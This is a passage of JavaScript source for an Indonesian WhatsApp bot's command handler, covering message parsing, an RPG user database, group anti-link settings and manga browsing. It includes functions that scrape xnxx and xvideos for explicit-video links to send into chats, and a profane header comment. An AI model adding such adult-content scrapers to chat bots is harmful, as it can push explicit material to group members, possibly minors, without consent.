/*
     *Base : Fallzx
     *Creator : KilianXD
     *Created On : 19/3/25
     *Whatsapp : 6288286624778
     *Chanel Yt : @KilianHost
     
     JANGAN JUAL MEMEK,, RECODE? JANGAN HAPUS CREDITNYA ANJINK 
     CREATED : KilianXD
     CH RESMI : https://whatsapp.com/channel/0029Vb7gTNO5a2450z5MnD0k
*/

//==================================================================\\
//===================[ TEMPAT MODULE ]=====================\\
require("./config");
const fs = require("fs");
const util = require("util");
const axios = require("axios");
const { exec, spawn, execSync } = require("child_process");
const Jimp = require("jimp");
const chalk = require("chalk");
const { createCanvas, loadImage, registerFont } = require("canvas");
const sharp = require("sharp");
const { fromBuffer } = require("file-type");
const FormData = require("form-data");
const moment = require("moment-timezone");
const didyoumean = require("didyoumean");
const similarity = require("similarity");
const yts = require("yt-search");
const ytdl = require("@vreden/youtube_scraper");
const translate = require("translate-google-api");
const { GoogleGenerativeAI } = require("@google/generative-ai");
const cheerio = require("cheerio");
const path = require("path");
const { ImageUploadService } = require("node-upload-images");
const { Sticker } = require("wa-sticker-formatter");
const { Primbon } = require("scrape-primbon");
const primbon = new Primbon();
const yy1 = "`";
const yy2 = "```";
const {
  FajarNews,
  BBCNews,
  metroNews,
  CNNNews,
  iNews,
  KumparanNews,
  TribunNews,
  DailyNews,
  DetikNews,
  OkezoneNews,
  CNBCNews,
  KompasNews,
  SindoNews,
  TempoNews,
  IndozoneNews,
  AntaraNews,
  RepublikaNews,
  VivaNews,
  KontanNews,
  MerdekaNews,
  KomikuSearch,
  AniPlanetSearch,
  KomikFoxSearch,
  KomikStationSearch,
  MangakuSearch,
  KiryuuSearch,
  KissMangaSearch,
  KlikMangaSearch,
  PalingMurah,
  LayarKaca21,
  AminoApps,
  Mangatoon,
  WAModsSearch,
  Emojis,
  CoronaInfo,
  JalanTikusMeme,
  Cerpen,
  Quotes,
  Couples,
  Darkjokes,
} = require("dhn-api");
const { igdl: igdl, youtube: youtube, ttdl: ttdl } = require("btch-downloader");
let globalAutoAIStatus = false;

module.exports = async (Kilianhst, m) => {
  try {
    const from = m.key.remoteJid;
    const body =
      m.mtype === "conversation"
        ? m.message.conversation
        : m.mtype === "imageMessage"
        ? m.message.imageMessage.caption
        : m.mtype === "videoMessage"
        ? m.message.videoMessage.caption
        : m.mtype === "extendedTextMessage"
        ? m.message.extendedTextMessage.text
        : m.mtype === "buttonsResponseMessage"
        ? m.message.buttonsResponseMessage.selectedButtonId
        : m.mtype === "listResponseMessage"
        ? m.message.listResponseMessage.singleSelectReply.selectedRowId
        : m.mtype === "templateButtonReplyMessage"
        ? m.message.templateButtonReplyMessage.selectedId
        : m.mtype === "interactiveResponseMessage"
        ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id
        : m.mtype === "templateButtonReplyMessage"
        ? m.msg.selectedId
        : m.mtype === "messageContextInfo"
        ? m.message.buttonsResponseMessage?.selectedButtonId ||
          m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
          m.text
        : "";
    //==================================================================\\
    //==================================================================\\

    //==================================================================\\
    // FILE LIB
    //==================================================================\\
    const {
      smsg,
      fetchJson,
      getBuffer,
      fetchBuffer,
      getGroupAdmins,
      TelegraPh,
      isUrl,
      hitungmundur,
      sleep,
      clockString,
      checkBandwidth,
      runtime,
      tanggal,
      getRandom,
    } = require("./lib/myfunc");

    const {
      addResponList,
      delResponList,
      isAlreadyResponList,
      isAlreadyResponListGroup,
      sendResponList,
      updateResponList,
      getDataResponList,
    } = require("./lib/respon-list");

    const {
      isSetProses,
      addSetProses,
      removeSetProses,
      changeSetProses,
      getTextSetProses,
    } = require("./lib/setproses");

    const {
      isSetDone,
      addSetDone,
      removeSetDone,
      changeSetDone,
      getTextSetDone,
    } = require("./lib/setdone");

    const {
      getRegisteredRandomId,
      addRegisteredUser,
      createSerial,
      checkRegisteredUser,
    } = require("./lib/register.js");

    const prem = require("./lib/premium");
    let premium = JSON.parse(fs.readFileSync("./database/premium.json"));

    const {
      addFilter,
      addSpam,
      isFiltered,
      isSpam,
      ResetSpam,
    } = require("./lib/antispam");

    const {
      imageToWebp,
      videoToWebp,
      writeExifImg,
      writeExifVid,
      addExif,
    } = require("./lib/exif");

    const { remini } = require("./system/Scrape/remini");

    //==================================================================\\
    //==================================================================\\

    //==================================================================\\
    // PREFIX, ADMIN, OWNER, BOT
    //==================================================================\\
    const budy = typeof m.text === "string" ? m.text : "";
    const prefixRegex = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/;
    const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : ".";
    const isCmd = body.startsWith(prefix);
    const command = isCmd
      ? body.slice(prefix.length).trim().split(" ").shift().toLowerCase()
      : "";
    const args = body.trim().split(/ +/).slice(1);
    const text = (q = args.join(" "));
    const sender = m.key.fromMe
      ? Kilianhst.user.id.split(":")[0] + "@s.whatsapp.net" || Kilianhst.user.id
      : m.key.participant || m.key.remoteJid;
    const botNumber = await Kilianhst.decodeJid(Kilianhst.user.id);
    const senderNumber = sender.split("@")[0];
    const isCreator =
      (m &&
        m.sender &&
        [botNumber, ...global.owner]
          .map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net")
          .includes(m.sender)) ||
      false;
    const pushname = m.pushName || `${senderNumber}`;
    const isBot = botNumber.includes(senderNumber);
    const quoted = m.quoted ? m.quoted : m;
    const mime = (quoted.msg || quoted).mimetype || "";
    const qmsg = quoted.msg || quoted;
    const isMedia = /image|video|sticker|audio/.test(mime);
    const welcm = m.isGroup ? wlcm.includes(from) : false;
    const welcmm = m.isGroup ? wlcmm.includes(from) : false;
    const groupMetadata = m.isGroup
      ? await Kilianhst.groupMetadata(from).catch((e) => {})
      : "";
    const groupName = m.isGroup ? groupMetadata.subject : "";
    const participants = m.isGroup ? await groupMetadata.participants : "";
    const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : "";
    const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false;
    const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;
    const isRegistered = checkRegisteredUser(m.sender);
    const ments = (text) => {
      return text.match("@")
        ? [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(
            (v) => v[1] + "@s.whatsapp.net"
          )
        : [];
    };
    const fileFix = "./database/fixes.json";
    if (!fs.existsSync(fileFix)) fs.writeFileSync(fileFix, "{}");
    let fixes = JSON.parse(fs.readFileSync(fileFix));
    const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
    const isPrem = isCreator ? true : prem.checkPremiumUser(m.sender, premium);

    //==================================================================\\
    // FILE DATABASE
    //==================================================================\\
    let db_respon_list = JSON.parse(
      fs.readFileSync("./database/list-message.json")
    );
    let listStore = JSON.parse(fs.readFileSync("./database/list-message.json"));
    let set_proses = JSON.parse(fs.readFileSync("./database/set_proses.json"));
    let set_done = JSON.parse(fs.readFileSync("./database/set_done.json"));
    const ntilinkgc = JSON.parse(
      fs.readFileSync("./system/Database/Antilink/antilinkgc.json")
    );
    let ntvirtex = JSON.parse(
      fs.readFileSync("./system/Database/Antilink/antivirus.json")
    );
    let ntasing = JSON.parse(
      fs.readFileSync("./system/Database/Antilink/antiasing.json")
    );
    let ntwame = JSON.parse(
      fs.readFileSync("./system/Database/Antilink/antiwame.json")
    );
    let ntilinkall = JSON.parse(
      fs.readFileSync("./system/Database/Antilink/antilinkall.json")
    );
    let ntilinktwt = JSON.parse(
      fs.readFileSync("./system/Database/Antilink/antilinktwitter.json")
    );
    let ntilinktt = JSON.parse(
      fs.readFileSync("./system/Database/Antilink/antilinktiktok.json")
    );
    let ntilinktg = JSON.parse(
      fs.readFileSync("./system/Database/Antilink/antilinktelegram.json")
    );
    let ntilinkfb = JSON.parse(
      fs.readFileSync("./system/Database/Antilink/antilinkfacebook.json")
    );
    let ntilinkig = JSON.parse(
      fs.readFileSync("./system/Database/Antilink/antilinkinstagram.json")
    );
    let ntilinkytch = JSON.parse(
      fs.readFileSync("./system/Database/Antilink/antilinkytchannel.json")
    );
    let ntilinkytvid = JSON.parse(
      fs.readFileSync("./system/Database/Antilink/antilinkytvideo.json")
    );
    let ntilinktele = JSON.parse(
      fs.readFileSync("./system/Database/Antilink/antilinktelegram.json")
    );
    let ntilinkdewasa = JSON.parse(
      fs.readFileSync("./system/Database/Antilink/antilinkbokep.json")
    );
    let ntilinkterabox = JSON.parse(
      fs.readFileSync("./system/Database/Antilink/antilinkterabox.json")
    );
    let ntilinkmediafire = JSON.parse(
      fs.readFileSync("./system/Database/Antilink/antilinkmediafire.json")
    );
    let antibot = {};

    const AntiLink = m.isGroup ? ntilinkgc.includes(m.chat) : false;
    const AntiVirtex = m.isGroup ? ntvirtex.includes(m.chat) : false;
    const AntiLinkYoutubeVid = m.isGroup
      ? ntilinkytvid.includes(m.chat)
      : false;
    const AntiLinkYoutubeChannel = m.isGroup
      ? ntilinkytch.includes(m.chat)
      : false;
    const AntiLinkInstagram = m.isGroup ? ntilinkig.includes(m.chat) : false;
    const AntiLinkFacebook = m.isGroup ? ntilinkfb.includes(m.chat) : false;
    const AntiLinkTiktok = m.isGroup ? ntilinktt.includes(m.chat) : false;
    const AntiLinkTelegram = m.isGroup ? ntilinktg.includes(m.chat) : false;
    const AntiLinkTwitter = m.isGroup ? ntilinktwt.includes(m.chat) : false;
    const AntiLinkAll = m.isGroup ? ntilinkall.includes(m.chat) : false;
    const AntiWame = m.isGroup ? ntwame.includes(m.chat) : false;
    const AntiAsing = m.isGroup ? ntasing.includes(m.chat) : false;
    const AntiDewasa = m.isGroup ? ntilinkdewasa.includes(m.chat) : false;
    const AntiTerabox = m.isGroup ? ntilinkterabox.includes(m.chat) : false;
    const AntiMediafire = m.isGroup ? ntilinkmediafire.includes(m.chat) : false;
    const AntiTele = m.isGroup ? ntilinktele.includes(m.chat) : false;

    //==================================================================\\
    // TAMPILAN DI CONSOLE PANEL
    //==================================================================\\
    if (m.message) {
      console.log(
        chalk.black(chalk.bgWhite("[ PESAN ]")),
        chalk.black(chalk.bgGreen(new Date())),
        chalk.black(chalk.bgBlue(budy || m.mtype)) +
          "\n" +
          chalk.magenta("=> Dari"),
        chalk.green(pushname),
        chalk.yellow(m.sender) + "\n" + chalk.blueBright("=> Di"),
        chalk.green(m.isGroup ? pushname : "Private Chat", from)
      );
    }

    //==================================================================\\
    // DATABASE NYA
    //==================================================================\\
    // Gak Usah Di Apa Apain Jika Tidak Mau Error
    try {
      ppuser = await Kilianhst.profilePictureUrl(m.sender, "image");
    } catch (err) {
      ppuser =
        "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60";
    }
    ppnyauser = await getBuffer(ppuser);
    try {
      let isNumber = (x) => typeof x === "number" && !isNaN(x);
      let limitUser = isPrem ? 1000 : 30;
      let user = global.db.data.users[m.sender];
      if (typeof user !== "object") global.db.data.users[m.sender] = {};
      if (user) {
        if (!isNumber(user.money)) user.money = 0;
        if (!isNumber(user.chip)) user.chip = 0;
        if (!isNumber(user.atm)) user.atm = 0;
        if (!isNumber(user.fullatm)) user.fullatm = 0;
        if (!isNumber(user.bank)) user.bank = 0;
        if (!isNumber(user.health)) user.health = 100;
        if (!isNumber(user.potion)) user.potion = 0;
        if (!isNumber(user.trash)) user.trash = 0;
        if (!isNumber(user.wood)) user.wood = 0;
        if (!isNumber(user.rock)) user.rock = 0;
        if (!isNumber(user.string)) user.string = 0;
        if (!isNumber(user.petfood)) user.petfood = 0;
        if (!isNumber(user.emerald)) user.emerald = 0;
        if (!isNumber(user.diamond)) user.diamond = 0;
        if (!isNumber(user.gold)) user.gold = 0;
        if (!isNumber(user.botol)) user.botol = 0;
        if (!isNumber(user.kardus)) user.kardus = 0;
        if (!isNumber(user.kaleng)) user.kaleng = 0;
        if (!isNumber(user.gelas)) user.gelas = 0;
        if (!isNumber(user.plastik)) user.plastik = 0;
        if (!isNumber(user.iron)) user.iron = 0;
        if (!isNumber(user.common)) user.common = 0;
        if (!isNumber(user.uncommon)) user.uncommon = 0;
        if (!isNumber(user.mythic)) user.mythic = 0;
        if (!isNumber(user.legendary)) user.legendary = 0;
        if (!isNumber(user.umpan)) user.umpan = 0;
        if (!isNumber(user.pet)) user.pet = 0;
        if (!isNumber(user.paus)) user.paus = 0;
        if (!isNumber(user.kepiting)) user.kepiting = 0;
        if (!isNumber(user.gurita)) user.gurita = 0;
        if (!isNumber(user.cumi)) user.cumi = 0;
        if (!isNumber(user.buntal)) user.buntal = 0;
        if (!isNumber(user.dory)) user.dory = 0;
        if (!isNumber(user.lumba)) user.lumba = 0;
        if (!isNumber(user.lobster)) user.lobster = 0;
        if (!isNumber(user.hiu)) user.hiu = 0;
        if (!isNumber(user.udang)) user.udang = 0;
        if (!isNumber(user.orca)) user.orca = 0;
        if (!isNumber(user.banteng)) user.banteng = 0;
        if (!isNumber(user.gajah)) user.gajah = 0;
        if (!isNumber(user.harimau)) user.harimau = 0;
        if (!isNumber(user.kambing)) user.kambing = 0;
        if (!isNumber(user.panda)) user.panda = 0;
        if (!isNumber(user.buaya)) user.buaya = 0;
        if (!isNumber(user.kerbau)) user.kerbau = 0;
        if (!isNumber(user.sapi)) user.sapi = 0;
        if (!isNumber(user.monyet)) user.monyet = 0;
        if (!isNumber(user.babihutan)) user.babihutan = 0;
        if (!isNumber(user.babi)) user.babi = 0;
        if (!isNumber(user.ayam)) user.ayam = 0;
        if (!isNumber(user.lastadventure)) user.lastadventure = 0;
        if (!isNumber(user.lastkill)) user.lastkill = 0;
        if (!isNumber(user.lastmisi)) user.lastmisi = 0;
        if (!isNumber(user.lastdungeon)) user.lastdungeon = 0;
        if (!isNumber(user.lastwar)) user.lastwar = 0;
        if (!isNumber(user.lastsda)) user.lastsda = 0;
        if (!isNumber(user.lastduel)) user.lastduel = 0;
        if (!isNumber(user.lastmining)) user.lastmining = 0;
        if (!isNumber(user.lasthunt)) user.lasthunt = 0;
        if (!isNumber(user.lastgift)) user.lastgift = 0;
        if (!isNumber(user.lastberkebon)) user.lastberkebon = 0;
        if (!isNumber(user.lastdagang)) user.lastdagang = 0;
        if (!isNumber(user.lasthourly)) user.lasthourly = 0;
        if (!isNumber(user.lastbansos)) user.lastbansos = 0;
        if (!isNumber(user.lastrampok)) user.lastrampok = 0;
        if (!isNumber(user.lastclaim)) user.lastclaim = 0;
        if (!isNumber(user.lastnebang)) user.lastnebang = 0;
        if (!isNumber(user.lastweekly)) user.lastweekly = 0;
        if (!isNumber(user.lastmonthly)) user.lastmonthly = 0;
        if (!isNumber(user.apel)) user.apel = 0;
        if (!isNumber(user.anggur)) user.anggur = 0;
        if (!isNumber(user.jeruk)) user.jeruk = 0;
        if (!isNumber(user.mangga)) user.mangga = 0;
        if (!isNumber(user.pisang)) user.pisang = 0;
        if (!isNumber(user.makanan)) user.makanan = 0;
        if (!isNumber(user.bibitanggur)) user.bibitanggur = 0;
        if (!isNumber(user.bibitpisang)) user.bibitpisang = 0;
        if (!isNumber(user.bibitapel)) user.bibitapel = 0;
        if (!isNumber(user.bibitmangga)) user.bibitmangga = 0;
        if (!isNumber(user.bibitjeruk)) user.bibitjeruk = 0;
        if (!isNumber(user.horse)) user.horse = 0;
        if (!isNumber(user.exp)) user.exp = 0;
        if (!isNumber(user.horseexp)) user.horseexp = 0;
        if (!isNumber(user.cat)) user.cat = 0;
        if (!isNumber(user.catexp)) user.catexp = 0;
        if (!isNumber(user.fox)) user.fox = 0;
        if (!isNumber(user.foxhexp)) user.foxexp = 0;
        if (!isNumber(user.dog)) user.foxexp = 0;
        if (!isNumber(user.dogexp)) user.dogexp = 0;
        if (!isNumber(user.robo)) user.robo = 0;
        if (!isNumber(user.roboexp)) user.roboexp = 0;
        if (!isNumber(user.horselastfeed)) user.horselastfeed = 0;
        if (!isNumber(user.catlastfeed)) user.catlastfeed = 0;
        if (!isNumber(user.robolastfeed)) user.robolastfeed = 0;
        if (!isNumber(user.foxlastfeed)) user.foxlastfeed = 0;
        if (!isNumber(user.doglastfeed)) user.doglastfeed = 0;
        if (!isNumber(user.robo)) user.robo = 0;
        if (!isNumber(user.robodurability)) user.robodurability = 0;
        if (!isNumber(user.armor)) user.armor = 0;
        if (!isNumber(user.armordurability)) user.armordurability = 0;
        if (!isNumber(user.sword)) user.sword = 0;
        if (!isNumber(user.sworddurability)) user.sworddurability = 0;
        if (!isNumber(user.pickaxe)) user.pickaxe = 0;
        if (!isNumber(user.pickaxedurability)) user.pickaxedurability = 0;
        if (!isNumber(user.fishingrod)) user.fishingrod = 0;
        if (!isNumber(user.fishingroddurability)) user.fishingroddurability = 0;
        if (!isNumber(user.afkTime)) user.afkTime = -1;
        if (!("afkReason" in user)) user.afkReason = "";
        if (!isNumber(user.limit)) user.limit = limitUser;
      } else
        global.db.data.users[m.sender] = {
          afkTime: -1,
          afkReason: "",
          limit: limitUser,
          money: 30000,
          exp: 0,
          limit: 50,
          freelimit: 0,
          lastclaim: 0,
          skata: 0,
          registered: false,
          name: m.name,
          pc: 0,
          joinlimit: 1,
          age: -1,
          regTime: -1,
          unreg: false,
          afk: -1,
          afkReason: "",
          banned: false,
          bannedTime: 0,
          warning: 0,
          level: 0,
          rokets: 0,
          role: "Beginner",
          skill: "",
          ojekk: 0,
          WarnReason: "",
          chip: 0,
          bank: 0,
          atm: 0,
          fullatm: 0,
          health: 100,
          potion: 10,
          trash: 0,
          wood: 0,
          rock: 0,
          string: 0,
          emerald: 0,
          diamond: 0,
          gold: 0,
          iron: 0,
          common: 0,
          uncommon: 0,
          mythic: 0,
          legendary: 0,
          umpan: 0,
          pet: 0,
          horse: 0,
          horseexp: 0,
          horselastfeed: 0,
          cat: 0,
          catexp: 0,
          catlastfeed: 0,
          fox: 0,
          foxexp: 0,
          foxlastfeed: 0,
          robo: 0,
          roboexp: 0,
          robolastfeed: 0,
          dog: 0,
          dogexp: 0,
          doglastfeed: 0,
          paus: 0,
          kepiting: 0,
          gurita: 0,
          cumi: 0,
          buntal: 0,
          dory: 0,
          lumba: 0,
          lobster: 0,
          hiu: 0,
          udang: 0,
          ikan: 0,
          orca: 0,
          banteng: 0,
          harimau: 0,
          gajah: 0,
          kambing: 0,
          buaya: 0,
          kerbau: 0,
          sapi: 0,
          monyet: 0,
          babi: 0,
          ayam: 0,
          armor: 0,
          armordurability: 0,
          sword: 0,
          sworddurability: 0,
          pickaxe: 0,
          pickaxedurability: 0,
          fishingrod: 0,
          fishingroddurability: 0,
          robo: 0,
          robodurability: 0,
          apel: 20,
          pisang: 0,
          anggur: 0,
          mangga: 0,
          jeruk: 0,
          lastadventure: 0,
          lastkill: 0,
          lastmisi: 0,
          lastdungeon: 0,
          lastwar: 0,
          lastsda: 0,
          lastduel: 0,
          lastmining: 0,
          lasthunt: 0,
          lastgift: 0,
          lastberkebon: 0,
          lastdagang: 0,
          lasthourly: 0,
          lastbansos: 0,
          lastrampok: 0,
          lastclaim: 0,
          lastnebang: 0,
          lastweekly: 0,
          lastmonthly: 0,
        };
    } catch (err) {
      console.log(err);
    }

    let chats = global.db.data.chats[from];
    if (typeof chats !== "object") global.db.data.chats[from] = {};
    if (chats) {
      if (!("antiviewonce" in chats)) chats.antiviewonce = false;
      if (!("antimedia" in chats)) chats.media = false;
      if (!("antiimage" in chats)) chats.antiimage = false;
      if (!("antivideo" in chats)) chats.video = false;
      if (!("antiaudio" in chats)) chats.antiaudio = false;
      if (!("antipoll" in chats)) chats.antipoll = false;
      if (!("antisticker" in chats)) chats.antisticker = false;
      if (!("anticontact" in chats)) chats.anticontact = false;
      if (!("antilocation" in chats)) chats.antilocation = false;
      if (!("antidocument" in chats)) chats.antidocument = false;
      if (!("antilinkgc" in chats)) chats.antilinkgc = false;
      if (!("antispam" in chats)) chats.antispam = false;
      if (!("antipromotion" in chats)) chats.antipromotion = false;
    } else
      global.db.data.chats[from] = {
        antiviewonce: false,
        antimedia: false,
        antiimage: false,
        antivideo: false,
        antiaudio: false,
        antipoll: false,
        antisticker: false,
        antispam: false,
        antilocation: false,
        antidocument: false,
        anticontact: false,
        antipromotion: false,
        antilinkgc: false,
      };

    let setting = global.db.data.settings[botNumber];
    if (typeof setting !== "object") global.db.data.settings[botNumber] = {};
    if (setting) {
      if (!("autoread" in setting)) setting.autoread = true;
    } else
      global.db.data.settings[botNumber] = {
        autoread: true,
      };

    //==================================================================\\
    // FUNCTION LAINNYA
    //==================================================================\\
    // GROUP
    if (
      m.isGroup &&
      isAlreadyResponList(m.chat, body.toLowerCase(), db_respon_list)
    ) {
      var get_data_respon = getDataResponList(
        m.chat,
        body.toLowerCase(),
        db_respon_list
      );
      if (get_data_respon.isImage === false) {
        Kilianhst.sendMessage(
          m.chat,
          { text: sendResponList(m.chat, body.toLowerCase(), db_respon_list) },
          {
            quoted: m,
          }
        );
      } else {
        Kilianhst.sendMessage(
          m.chat,
          {
            image: await getBuffer(get_data_respon.image_url),
            caption: get_data_respon.response,
          },
          {
            quoted: m,
          }
        );
      }
    }

    if (m.message?.buttonsResponseMessage) {
      const buttonId = m.message.buttonsResponseMessage.selectedButtonId;

      // Handle tombol navigasi halaman & lanjut chapter
      if (
        buttonId.startsWith("manga_next") ||
        buttonId.startsWith("manga_prev")
      ) {
        const [action, chapterId, pageStr, mangaId, chapterIndex] =
          buttonId.split("|");
        const pageNow = parseInt(pageStr);
        const newPage = action === "manga_next" ? pageNow + 1 : pageNow - 1;

        try {
          const imgRes = await fetch(
            `https://api.mangadex.org/at-home/server/${chapterId}`
          );
          const imgData = await imgRes.json();
          const pages = imgData.chapter.data;
          const hash = imgData.chapter.hash;
          const baseUrl = imgData.baseUrl;

          if (newPage < 0) return reply("Halaman sudah di awal.");
          if (newPage >= pages.length) {
            return Kilianhst.sendMessage(
              from,
              {
                text: "Kamu sudah di halaman terakhir.\nKlik tombol di bawah untuk lanjut ke chapter berikutnya.",
                buttons: [
                  {
                    buttonId: `manga_nextchapter|${mangaId}|${chapterIndex}`,
                    buttonText: { displayText: "➡️ Chapter Berikutnya" },
                    type: 1,
                  },
                ],
                headerType: 1,
              },
              { quoted: m }
            );
          }

          const pageUrl = `${baseUrl}/data/${hash}/${pages[newPage]}`;

          await Kilianhst.sendMessage(
            from,
            {
              image: { url: pageUrl },
              caption: `Halaman ${newPage + 1} dari ${pages.length}`,
              buttons: [
                {
                  buttonId: `manga_prev|${chapterId}|${newPage}|${mangaId}|${chapterIndex}`,
                  buttonText: { displayText: "⬅️ Sebelumnya" },
                  type: 1,
                },
                {
                  buttonId: `manga_next|${chapterId}|${newPage}|${mangaId}|${chapterIndex}`,
                  buttonText: { displayText: "➡️ Berikutnya" },
                  type: 1,
                },
              ],
              headerType: 4,
            },
            { quoted: m }
          );
        } catch (e) {
          console.error("[Manga Page Nav]", e);
          reply("Gagal memuat halaman.");
        }
      }

      // Handle tombol next chapter
      if (buttonId.startsWith("manga_nextchapter")) {
        const [_, mangaId, indexStr] = buttonId.split("|");
        const nextIndex = parseInt(indexStr) + 1;

        try {
          const chRes = await fetch(
            `https://api.mangadex.org/manga/${mangaId}/feed?translatedLanguage[]=en&order[chapter]=asc&limit=500`
          );
          const chData = await chRes.json();
          const chapters = chData.data;

          if (nextIndex >= chapters.length)
            return reply("Sudah sampai chapter terakhir.");

          const nextChapter = chapters[nextIndex];
          const chapterId = nextChapter.id;
          const chapterTitle =
            nextChapter.attributes.title ||
            `Chapter ${nextChapter.attributes.chapter}`;

          const imgRes = await fetch(
            `https://api.mangadex.org/at-home/server/${chapterId}`
          );
          const imgData = await imgRes.json();
          const pages = imgData.chapter.data;
          const hash = imgData.chapter.hash;
          const baseUrl = imgData.baseUrl;

          const pageNow = 0;
          const pageUrl = `${baseUrl}/data/${hash}/${pages[pageNow]}`;

          await Kilianhst.sendMessage(
            from,
            {
              image: { url: pageUrl },
              caption: `*${chapterTitle}*\nHalaman 1 dari ${pages.length}`,
              buttons: [
                {
                  buttonId: `manga_prev|${chapterId}|${pageNow}|${mangaId}|${nextIndex}`,
                  buttonText: { displayText: "⬅️ Sebelumnya" },
                  type: 1,
                },
                {
                  buttonId: `manga_next|${chapterId}|${pageNow}|${mangaId}|${nextIndex}`,
                  buttonText: { displayText: "➡️ Berikutnya" },
                  type: 1,
                },
              ],
              headerType: 4,
            },
            { quoted: m }
          );
        } catch (e) {
          console.error("[Next Chapter Error]", e);
          reply("Gagal memuat chapter berikutnya.");
        }
      }
    }

    function getRandomFile(ext) {
      return `${Math.floor(Math.random() * 10000)}${ext}`;
    }

    // AUTOREAD
    if (global.autoread) {
      Kilianhst.readMessages([m.key]);
    }

    // UKURAN PROFILE
    const reSize = async (buffer, ukur1, ukur2) => {
      return new Promise(async (resolve, reject) => {
        let jimp = require("jimp");
        var baper = await jimp.read(buffer);
        var ab = await baper
          .resize(ukur1, ukur2)
          .getBufferAsync(jimp.MIME_JPEG);
        resolve(ab);
      });
    };

    if (
      m.isGroup &&
      m.mentionedJid?.includes(`${global.owner}@s.whatsapp.net`) && // Bot ditandai
      m.quoted?.sender !== `${global.owner}@s.whatsapp.net` && // Pastikan bot tidak yang mengirim pesan yang dikutip
      m.key.fromMe !== true // Pastikan bot bukan yang mengirim pesan ini
    ) {
      Kilianhst.sendMessage(m.chat, { text: "Caper bgt tag-tag Kilian" });
    }

    // Simpan waktu terakhir owner disambut di grup
    const lastGreet = global.lastGreet || (global.lastGreet = {});
    // Ambil daftar JID owner
    const ownerJidList = global.owner
      .map((x) => (typeof x === "object" ? x[0] : x))
      .map((n) => `${n}@s.whatsapp.net`);
    if (m.isGroup && ownerJidList.includes(m.sender)) {
      const now = Date.now();
      const key = `${m.chat}_${m.sender}`;
      const lastTime = lastGreet[key] || 0;
      // Hanya sambut jika belum dalam 30 menit
      if (now - lastTime > 30 * 60 * 1000) {
        Kilianhst.sendMessage(m.chat, {
          text: "Selamat Datang Kembali Owner Ku",
        }); // tanpa quoted!
        lastGreet[key] = now;
      }
    }

    // MENAMPILKAN PROFILE USERS
    const fkethmb = await reSize(ppuser, 300, 300);
    // function resize
    let jimp = require("jimp");
    const resize = async (image, width, height) => {
      const read = await jimp.read(image);
      const data = await read
        .resize(width, height)
        .getBufferAsync(jimp.MIME_JPEG);
      return data;
    };

    async function searchXNXX(query) {
      const url = `https://www.xnxx.com/search/${encodeURIComponent(query)}`;
      const res = await fetch(url, {
        headers: {
          "User-Agent": "Mozilla/5.0",
        },
      });
      const html = await res.text();
      const $ = cheerio.load(html);
      const results = [];

      $(".mozaique .thumb").each((i, el) => {
        const title = $(el).find("a").attr("title");
        const link = "https://www.xnxx.com" + $(el).find("a").attr("href");
        const thumb =
          $(el).find("img").attr("data-src") || $(el).find("img").attr("src");

        results.push({ title, link, thumb });
      });

      return results.slice(0, 5); // ambil 5 teratas
    }

    async function searchXvideos(query) {
      const url = `https://www.xvideos.com/?k=${encodeURIComponent(query)}`;
      const res = await fetch(url, {
        headers: {
          "User-Agent": "Mozilla/5.0",
        },
      });
      const html = await res.text();
      const $ = cheerio.load(html);
      const results = [];

      $(".thumb-block").each((i, el) => {
        const title = $(el).find("p.title a").text().trim();
        const link =
          "https://www.xvideos.com" + $(el).find("p.title a").attr("href");
        const thumb =
          $(el).find("img").attr("data-src") || $(el).find("img").attr("src");

        if (title && link && thumb) {
          results.push({ title, link, thumb });
        }
      });

      return results.slice(0, 5); // ambil 5 video pertama
    }

    const prefixOperator = {
      telkomsel: [
        "0811",
        "0812",
        "0813",
        "0821",
        "0822",
        "0852",
        "0853",
        "0823",
      ],
      indosat: ["0814", "0815", "0816", "0855", "0856", "0857", "0858"],
      xl: ["0817", "0818", "0819", "0859", "0877", "0878"],
      axis: ["0838", "0831", "0832", "0833"],
      tri: ["0895", "0896", "0897", "0898", "0899"],
      smartfren: [
        "0881",
        "0882",
        "0883",
        "0884",
        "0885",
        "0886",
        "0887",
        "0888",
        "0889",
      ],
      byu: ["0851"],
    };

    function detectOperator(nomor) {
      const prefix = nomor.slice(0, 4);
      for (let [operator, daftar] of Object.entries(prefixOperator)) {
        if (daftar.includes(prefix)) {
          return operator.charAt(0).toUpperCase() + operator.slice(1);
        }
      }
      return "Tidak diketahui";
    }

    async function xvideosPlay(query) {
      const searchURL = `https://www.xvideos.com/?k=${encodeURIComponent(
        query
      )}`;
      const res = await fetch(searchURL, {
        headers: { "User-Agent": "Mozilla/5.0" },
      });
      const html = await res.text();
      const $ = cheerio.load(html);

      const firstResult = $(".thumb-block").first();
      const videoLink =
        "https://www.xvideos.com" + firstResult.find("p.title a").attr("href");

      if (!videoLink) return null;

      // Masuk ke halaman video detail
      const detailRes = await fetch(videoLink, {
        headers: { "User-Agent": "Mozilla/5.0" },
      });
      const detailHtml = await detailRes.text();
      const $$ = cheerio.load(detailHtml);

      const title = $$("h2.page-title").text().trim();
      const thumbnail = $$('meta[property="og:image"]').attr("content");
      const videoUrl = detailHtml.match(/setVideoUrlHigh\('(.*?)'\)/)?.[1]; // MP4 direct link

      if (!videoUrl) return null;

      return {
        title,
        thumbnail,
        videoUrl,
        videoLink,
      };
    }

    const isUserRegistered = (userId) => {
      const data = fs.readFileSync("./system/RPG/join.json", "utf8");
      const users = JSON.parse(data);
      return users.some((user) => user.id === userId);
    };
    const ckusrjoin = m.sender;
    const JSON_FILE_PATH = "./system/RPG/gacha_result.json";

    async function spinItem(chatId) {
      const items = [
        "*Mahkota Tuan Buas 👑*",
        "*Gacha 1x Token 🎟*",
        "*Emoji Respec++ 😎*",
        "*Logamon Chip [ More Power Rpg 🔓 ]*",
        "*Rebootmon Chip [ Super Power Rpg 🔓 ]*",
      ];
      const randomIndex = Math.floor(Math.random() * items.length);
      const selectedItem = items[randomIndex];
      let gachaResults = [];
      try {
